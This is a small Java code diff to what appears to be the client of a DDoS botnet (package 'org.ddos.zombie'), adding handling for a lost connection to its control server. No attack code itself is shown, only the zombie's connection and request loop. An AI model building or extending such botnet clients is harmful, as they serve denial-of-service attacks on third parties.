@@ -1,5 +1,6 @@
 package org.ddos.zombie;
 
+import java.io.EOFException;
 import java.io.IOException;
 
 import org.ddos.network.ZombieNetwork;
@@ -11,6 +12,9 @@ public class ZombieMain {
 		try {
 			ZombieNetwork.setClient(new Connection(ServerConstants.ADDRESS, ServerConstants.PORT));
 			RequestHandler.handleRequest();
+		} catch (EOFException e) {
+			System.out.println("Disconnected from server.");
+			return;
 		} catch (ClassNotFoundException e) {
 			e.printStackTrace();
 		} catch (IOException e) {
